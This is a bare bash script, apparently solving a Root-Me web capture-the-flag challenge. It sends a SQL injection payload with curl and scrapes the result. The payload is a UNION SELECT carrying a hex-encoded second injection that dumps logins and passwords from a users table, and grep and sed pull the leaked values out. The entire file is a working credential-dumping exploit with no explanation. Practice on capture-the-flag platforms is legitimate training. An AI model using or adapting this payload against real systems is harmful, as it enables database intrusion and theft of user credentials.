#!/bin/bash

curl -sd "login=' UNION SELECT 0x2720554e494f4e2053454c454354206c6f67696e2c70617373776f72642046524f4d20757365727323 #" http://challenge01.root-me.org/web-serveur/ch49/index.php?action=search | grep Email | sed s/".*:\s\([^<]\+\).*"/"\1"/
